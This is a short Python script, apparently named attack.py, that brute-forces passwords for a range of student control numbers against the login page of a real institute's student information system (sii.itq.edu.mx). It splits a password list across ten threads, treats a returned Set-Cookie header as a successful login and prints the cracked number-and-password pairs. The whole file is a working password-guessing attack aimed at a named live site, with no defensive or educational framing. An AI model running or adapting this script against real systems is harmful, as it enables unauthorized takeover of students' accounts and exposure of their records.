import requests
import sys
import threading

found = False
def get_credentials(no_control, password):
    return f'[{no_control}] [{password}]'

def find_password(no_control, passwords):
    global found
    url = 'http://sii.itq.edu.mx/sistema/index.php'
    welcome = 'http://sii.itq.edu.mx/sistema/modulos/alu/'
    data = {'no_de_control': no_control, 'password': ''}
    session = requests.session()
    for password in passwords:
        if password == '5123':
            print('No te desesperes...')
        data['password'] = password
        response = session.post(url, data)
        if response.headers.get('Set-Cookie') != None:
            print(get_credentials(no_control, password))
            found = True #Stop others threads
            break
        elif found:
            break
    if not found:
        print(f'Password not found for [{no_control}]')

def parallel_find_password(no_control, passwords):
    threads = [threading.Thread(target=find_password, args=(no_control, passwords[i*1000:(i+1)*1000])) for i in range(0,10)]
    [thread.start() for thread in threads]
    [thread.join() for thread in threads]

def main():
    global found
    args = sys.argv
    if len(args) < 1:
        print('Usage: python3 attack.py {no_control_a} {no_control_b} < {passwords_file}')
        exit(1)

    no_control = int(args[1])
    final = no_control
    if len(args) > 2:
        final = int(args[2])

    passwords = [line.strip() for line in sys.stdin]
    print(f'Attacking...\nFrom: {no_control}\nTo: {final}')
    while no_control <= final:
        found = False
        parallel_find_password(no_control, passwords)
        no_control += 1

main()
